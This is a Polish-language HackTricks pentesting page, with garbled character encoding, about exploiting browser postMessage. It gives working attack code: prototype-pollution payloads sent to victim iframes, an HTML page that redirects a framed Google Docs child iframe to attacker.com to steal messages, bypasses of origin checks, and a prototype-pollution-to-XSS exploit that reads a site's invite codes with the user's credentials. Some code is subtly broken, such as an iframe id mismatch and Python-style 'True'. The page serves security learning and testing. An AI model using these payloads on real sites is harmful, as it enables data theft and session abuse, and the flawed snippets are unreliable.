# Luki PostMessage

## Luki PostMessage

<details>

<summary><strong>Naucz siÄ™ hakowaÄ‡ AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* JeÅ›li chcesz zobaczyÄ‡ swojÄ… **firmÄ™ reklamowanÄ… w HackTricks** lub **pobraÄ‡ HackTricks w formacie PDF**, sprawdÅº [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* ZdobÄ…dÅº [**oficjalne gadÅ¼ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**RodzinÄ™ PEASS**](https://opensea.io/collection/the-peass-family), naszÄ… kolekcjÄ™ ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podziel siÄ™ swoimi sztuczkami hakerskimi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) na githubie.

</details>

## WyÅ›lij **PostMessage**

**PostMessage** uÅ¼ywa nastÄ™pujÄ…cej funkcji do wysyÅ‚ania wiadomoÅ›ci:
```bash
targetWindow.postMessage(message, targetOrigin, [transfer]);

# postMessage to current page
window.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe with id "idframe"
<iframe id="idframe" src="http://victim.com/"></iframe>
document.getElementById('idframe').contentWindow.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe via onload
<iframe src="https://victim.com/" onload="this.contentWindow.postMessage('<script>print()</script>','*')">

# postMessage to popup
win = open('URL', 'hack', 'width=800,height=300,top=500');
win.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an URL
window.postMessage('{"__proto__":{"isAdmin":True}}', 'https://company.com')

# postMessage to iframe inside popup
win = open('URL-with-iframe-inside', 'hack', 'width=800,height=300,top=500');
## loop until win.length == 1 (until the iframe is loaded)
win[0].postMessage('{"__proto__":{"isAdmin":True}}', '*')
```
ZauwaÅ¼, Å¼e **targetOrigin** moÅ¼e byÄ‡ '\*' lub adresem URL, na przykÅ‚ad _https://company.com._\
W **drugim scenariuszu** **wiadomoÅ›Ä‡ moÅ¼e byÄ‡ wysÅ‚ana tylko do tego domeny** (nawet jeÅ›li pochodzenie obiektu okna jest inne).\
JeÅ›li uÅ¼ywany jest **znak wieloznaczny**, **wiadomoÅ›ci mogÄ… byÄ‡ wysyÅ‚ane do dowolnej domeny**, i zostanÄ… wysÅ‚ane do pochodzenia obiektu Window.

### Atakowanie iframe i znaku wieloznacznego w **targetOrigin**

Jak wyjaÅ›niono w [**tym raporcie**](https://blog.geekycat.in/google-vrp-hijacking-your-screenshots/), jeÅ›li znajdziesz stronÄ™, ktÃ³ra moÅ¼e byÄ‡ **osadzona w iframe** (bez ochrony `X-Frame-Header`) i ktÃ³ra **wysyÅ‚a wraÅ¼liwÄ…** wiadomoÅ›Ä‡ za pomocÄ… **postMessage** uÅ¼ywajÄ…c **znaku wieloznacznego** (\*), moÅ¼esz **zmodyfikowaÄ‡** **pochodzenie** **iframe** i **ujawniÄ‡** **wraÅ¼liwÄ…** wiadomoÅ›Ä‡ do domeny kontrolowanej przez Ciebie.\
ZauwaÅ¼, Å¼e jeÅ›li strona moÅ¼e byÄ‡ osadzona w iframe, ale **targetOrigin** jest **ustawiony na adres URL, a nie na znak wieloznaczny**, ten **sztuczka nie zadziaÅ‚a**.
```markup
<html>
<iframe src="https://docs.google.com/document/ID" />
<script>
setTimeout(exp, 6000); //Wait 6s

//Try to change the origin of the iframe each 100ms
function exp(){
setInterval(function(){
window.frames[0].frame[0][2].location="https://attacker.com/exploit.html";
}, 100);
}
</script>
```
## Wykorzystanie addEventListener

**`addEventListener`** to funkcja uÅ¼ywana przez JS do zadeklarowania funkcji, ktÃ³ra **oczekuje na `postMessages`**.\
Zostanie uÅ¼yty kod podobny do poniÅ¼szego:
```javascript
window.addEventListener("message", (event) => {
if (event.origin !== "http://example.org:8080")
return;

// ...
}, false);
```
ZauwaÅ¼ w tym przypadku, jak **pierwszÄ… rzeczÄ…**, ktÃ³rÄ… robi kod, jest **sprawdzenie pochodzenia**. Jest to niezwykle **waÅ¼ne**, gÅ‚Ã³wnie jeÅ›li strona ma wykonaÄ‡ **jakiekolwiek czynnoÅ›ci wymagajÄ…ce uwagi** w otrzymanych informacjach (np. zmiana hasÅ‚a). **JeÅ›li nie sprawdzi siÄ™ pochodzenia, atakujÄ…cy mogÄ… zmusiÄ‡ ofiary do wysÅ‚ania dowolnych danych do tych punktÃ³w koÅ„cowych** i zmieniÄ‡ hasÅ‚a ofiar (w tym przykÅ‚adzie).

### Wyliczanie

Aby **znaleÅºÄ‡ nasÅ‚uchiwaczy zdarzeÅ„** na bieÅ¼Ä…cej stronie, moÅ¼na:

* **PrzeszukaÄ‡** kod JS w poszukiwaniu `window.addEventListener` i `$(window).on` (_wersja JQuery_)
* **WykonaÄ‡** w konsoli narzÄ™dzi deweloperskich: `getEventListeners(window)`

![](<../../.gitbook/assets/image (618) (1).png>)

* **PrzejdÅº do** _Elementy --> NasÅ‚uchiwacze zdarzeÅ„_ w narzÄ™dziach deweloperskich przeglÄ…darki

![](<../../.gitbook/assets/image (393).png>)

* UÅ¼yj **rozszerzenia przeglÄ…darki** takiego jak [**https://github.com/benso-io/posta**](https://github.com/benso-io/posta) lub [https://github.com/fransr/postMessage-tracker](https://github.com/fransr/postMessage-tracker). Te rozszerzenia przeglÄ…darki **przechwycÄ… wszystkie wiadomoÅ›ci** i pokaÅ¼Ä… je Tobie.

### OminiÄ™cia sprawdzania pochodzenia

* Atrybut **`event.isTrusted`** jest uwaÅ¼any za bezpieczny, poniewaÅ¼ zwraca `True` tylko dla zdarzeÅ„ generowanych przez autentyczne dziaÅ‚ania uÅ¼ytkownika. ChociaÅ¼ jego poprawne zaimplementowanie moÅ¼e byÄ‡ wyzwaniem do ominiÄ™cia, jego znaczenie w kontekÅ›cie kontroli bezpieczeÅ„stwa jest znaczÄ…ce.
*   UÅ¼ycie **`indexOf()`** do walidacji pochodzenia w zdarzeniach PostMessage moÅ¼e byÄ‡ podatne na ominiÄ™cie. PrzykÅ‚ad ilustrujÄ…cy tÄ™ podatnoÅ›Ä‡ to:

```javascript
("https://app-sj17.marketo.com").indexOf("https://app-sj17.ma")
```
*   Metoda **`search()`** z `String.prototype.search()` jest przeznaczona do wyraÅ¼eÅ„ regularnych, a nie do ciÄ…gÃ³w znakÃ³w. Przekazanie czegoÅ› innego niÅ¼ wyraÅ¼enie regularne prowadzi do konwersji domyÅ›lnej na wyraÅ¼enie regularne, co moÅ¼e sprawiÄ‡, Å¼e metoda bÄ™dzie potencjalnie nieskuteczna. Dzieje siÄ™ tak, poniewaÅ¼ w wyraÅ¼eniach regularnych kropka (.) dziaÅ‚a jako symbol wieloznaczny, umoÅ¼liwiajÄ…c ominiÄ™cie walidacji przy specjalnie spreparowanych domenach. Na przykÅ‚ad:

```javascript
"https://www.safedomain.com".search("www.s.fedomain.com")
```
* Funkcja **`match()`**, podobnie jak `search()`, przetwarza wyraÅ¼enia regularne. JeÅ›li wyraÅ¼enie regularne jest nieprawidÅ‚owo zbudowane, moÅ¼e byÄ‡ podatne na ominiÄ™cie.
*   Funkcja **`escapeHtml`** ma na celu oczyszczenie wejÅ›Ä‡ poprzez unikanie znakÃ³w. JednakÅ¼e nie tworzy nowego obiektu unikniÄ™tego, ale nadpisuje wÅ‚aÅ›ciwoÅ›ci istniejÄ…cego obiektu. To zachowanie moÅ¼e byÄ‡ wykorzystane. W szczegÃ³lnoÅ›ci, jeÅ›li obiekt moÅ¼na manipulowaÄ‡ w taki sposÃ³b, Å¼e jego kontrolowana wÅ‚aÅ›ciwoÅ›Ä‡ nie uznaje `hasOwnProperty`, `escapeHtml` nie bÄ™dzie dziaÅ‚aÄ‡ zgodnie z oczekiwaniami. Przedstawiono to na poniÅ¼szych przykÅ‚adach:

*   Oczekiwane niepowodzenie:

```javascript
result = u({
message: "'\"<b>\\"
});
result.message // "&#39;&quot;&lt;b&gt;\"
```
*   OminiÄ™cie unikania:

```javascript
result = u(new Error("'\"<b>\\"));
result.message; // "'"<b>\"
```

W kontekÅ›cie tej podatnoÅ›ci obiekt `File` jest szczegÃ³lnie podatny ze wzglÄ™du na swojÄ… tylko do odczytu wÅ‚aÅ›ciwoÅ›Ä‡ `name`. Ta wÅ‚aÅ›ciwoÅ›Ä‡, gdy jest uÅ¼ywana w szablonach, nie jest oczyszczana przez funkcjÄ™ `escapeHtml`, co prowadzi do potencjalnych zagroÅ¼eÅ„ dla bezpieczeÅ„stwa.
* WÅ‚aÅ›ciwoÅ›Ä‡ `document.domain` w JavaScript moÅ¼e byÄ‡ ustawiona przez skrypt w celu skrÃ³cenia domeny, co pozwala na bardziej elastycznÄ… egzekucjÄ™ polityki tego samego pochodzenia w obrÄ™bie tej samej domeny nadrzÄ™dnej.

### OminiÄ™cie e.origin == window.origin

Podczas osadzania strony internetowej w **zabezpieczonym iframe** za pomocÄ… %%%%%%, istotne jest zrozumienie, Å¼e pochodzenie iframu zostanie ustawione na null. Jest to szczegÃ³lnie istotne przy korzystaniu z **atrybutÃ³w sandbox** i ich wpÅ‚ywu na bezpieczeÅ„stwo i funkcjonalnoÅ›Ä‡.

Poprzez okreÅ›lenie **`allow-popups`** w atrybucie sandbox, kaÅ¼de okno popup otwarte z iframu dziedziczy ograniczenia sandboxa swojego rodzica. Oznacza to, Å¼e chyba Å¼e atrybut **`allow-popups-to-escape-sandbox`** jest rÃ³wnieÅ¼ uwzglÄ™dniony, pochodzenie okna popup jest rÃ³wnieÅ¼ ustawione na `null`, zgodnie z pochodzeniem iframu.

W rezultacie, gdy otwarte sÄ… okna popup w tych warunkach i wiadomoÅ›Ä‡ jest wysyÅ‚ana z iframu do popupu za pomocÄ… **`postMessage`**, zarÃ³wno nadawca, jak i odbiorca majÄ… swoje pochodzenia ustawione na `null`. Ta sytuacja prowadzi do scenariusza, w ktÃ³rym **`e.origin == window.origin`** jest prawdziwe (`null == null`), poniewaÅ¼ zarÃ³wno iframe, jak i popup majÄ… takÄ… samÄ… wartoÅ›Ä‡ pochodzenia `null`.

Aby uzyskaÄ‡ wiÄ™cej informacji, **przeczytaj**:

{% content-ref url="bypassing-sop-with-iframes-1.md" %}
[bypassing-sop-with-iframes-1.md](bypassing-sop-with-iframes-1.md)
{% endcontent-ref %}

### OminiÄ™cie e.source

MoÅ¼liwe jest sprawdzenie, czy wiadomoÅ›Ä‡ pochodzi z tego samego okna, w ktÃ³rym skrypt nasÅ‚uchuje (szczegÃ³lnie interesujÄ…ce dla **SkryptÃ³w zawartoÅ›ci z rozszerzeÅ„ przeglÄ…darki** w celu sprawdzenia, czy wiadomoÅ›Ä‡ zostaÅ‚a wysÅ‚ana z tej samej strony):
```javascript
// If itâ€™s not, return immediately.
if( received_message.source !== window ) {
return;
}
```
MoÅ¼esz zmusiÄ‡ **`e.source`** wiadomoÅ›ci do bycia nullem, tworzÄ…c **iframe**, ktÃ³ry **wysyÅ‚a** **postMessage** i jest **natychmiast usuwany**.

Aby uzyskaÄ‡ wiÄ™cej informacji, **przeczytaj:**

{% content-ref url="bypassing-sop-with-iframes-2.md" %}
[bypassing-sop-with-iframes-2.md](bypassing-sop-with-iframes-2.md)
{% endcontent-ref %}

### Bypass nagÅ‚Ã³wka X-Frame

Aby przeprowadziÄ‡ te ataki, idealnie byÅ‚oby **umieÅ›ciÄ‡ stronÄ™ ofiary** w `iframe`. Jednak niektÃ³re nagÅ‚Ã³wki, takie jak `X-Frame-Header`, mogÄ… **zapobiec** temu **zachowaniu**.\
W takich scenariuszach nadal moÅ¼na uÅ¼yÄ‡ mniej dyskretnego ataku. MoÅ¼na otworzyÄ‡ nowÄ… kartÄ™ do podatnej aplikacji internetowej i komunikowaÄ‡ siÄ™ z niÄ…:
```markup
<script>
var w=window.open("<url>")
setTimeout(function(){w.postMessage('text here','*');}, 2000);
</script>
```
### KradzieÅ¼ wiadomoÅ›ci wysÅ‚anej do dziecka poprzez zablokowanie gÅ‚Ã³wnej strony

Na poniÅ¼szej stronie moÅ¼esz zobaczyÄ‡, jak moÅ¼na ukraÅ›Ä‡ **wraÅ¼liwe dane postmessage** wysÅ‚ane do **dzieciÄ™cego iframe'a**, blokujÄ…c **gÅ‚Ã³wnÄ…** stronÄ™ przed wysÅ‚aniem danych i wykorzystujÄ…c **XSS w dziecku**, aby **wyciec dane** przed ich otrzymaniem:

{% content-ref url="blocking-main-page-to-steal-postmessage.md" %}
[blocking-main-page-to-steal-postmessage.md](blocking-main-page-to-steal-postmessage.md)
{% endcontent-ref %}

### KradzieÅ¼ wiadomoÅ›ci poprzez modyfikacjÄ™ lokalizacji iframe'a

JeÅ›li moÅ¼esz osadziÄ‡ stronÄ™ internetowÄ… bez nagÅ‚Ã³wka X-Frame-Options, ktÃ³ra zawiera inny iframe, moÅ¼esz **zmieniÄ‡ lokalizacjÄ™ tego dzieckowego iframe'a**, wiÄ™c jeÅ›li odbiera on **postmessage** wysÅ‚any za pomocÄ… **gwiazdki**, atakujÄ…cy moÅ¼e **zmieniÄ‡** pochodzenie tego iframe'a na stronÄ™ **kontrolowanÄ…** przez niego i **ukraÅ›Ä‡** wiadomoÅ›Ä‡:

{% content-ref url="steal-postmessage-modifying-iframe-location.md" %}
[steal-postmessage-modifying-iframe-location.md](steal-postmessage-modifying-iframe-location.md)
{% endcontent-ref %}

### postMessage do Zanieczyszczenia Prototypu i/lub XSS

W scenariuszach, gdzie dane wysyÅ‚ane za pomocÄ… `postMessage` sÄ… wykonywane przez JS, moÅ¼esz **osadziÄ‡** **stronÄ™** i **wykorzystaÄ‡** **zanieczyszczenie prototypu/XSS**, wysyÅ‚ajÄ…c exploit za pomocÄ… `postMessage`.

Kilka **bardzo dobrze wyjaÅ›nionych XSS poprzez `postMessage`** moÅ¼na znaleÅºÄ‡ pod adresem [https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html)

PrzykÅ‚ad exploitu do wykorzystania **Zanieczyszczenia Prototypu, a nastÄ™pnie XSS** poprzez `postMessage` do `iframe'a`:
```html
<html>
<body>
<iframe id="idframe" src="http://127.0.0.1:21501/snippets/demo-3/embed"></iframe>
<script>
function get_code() {
document.getElementById('iframe_victim').contentWindow.postMessage('{"__proto__":{"editedbymod":{"username":"<img src=x onerror=\\\"fetch(\'http://127.0.0.1:21501/api/invitecodes\', {credentials: \'same-origin\'}).then(response => response.json()).then(data => {alert(data[\'result\'][0][\'code\']);})\\\" />"}}}','*');
document.getElementById('iframe_victim').contentWindow.postMessage(JSON.stringify("refresh"), '*');
}

setTimeout(get_code, 2000);
</script>
</body>
</html>
```
Dla **wiÄ™cej informacji**:

* Link do strony o [**zanieczyszczeniu prototypu**](../deserialization/nodejs-proto-prototype-pollution/)
* Link do strony o [**XSS**](../xss-cross-site-scripting/)
* Link do strony o [**zanieczyszczeniu prototypu po stronie klienta do XSS**](../deserialization/nodejs-proto-prototype-pollution/#client-side-prototype-pollution-to-xss)

## Referencje

* [https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html)
* [https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd](https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd)
* Aby Ä‡wiczyÄ‡: [https://github.com/yavolo/eventlistener-xss-recon](https://github.com/yavolo/eventlistener-xss-recon)

<details>

<summary><strong>Naucz siÄ™ hakowaÄ‡ AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* JeÅ›li chcesz zobaczyÄ‡ swojÄ… **firmÄ™ reklamowanÄ… w HackTricks** lub **pobraÄ‡ HackTricks w formacie PDF**, sprawdÅº [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* ZdobÄ…dÅº [**oficjalne gadÅ¼ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**RodzinÄ™ PEASS**](https://opensea.io/collection/the-peass-family), naszÄ… kolekcjÄ™ ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podziel siÄ™ swoimi sztuczkami hakerskimi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
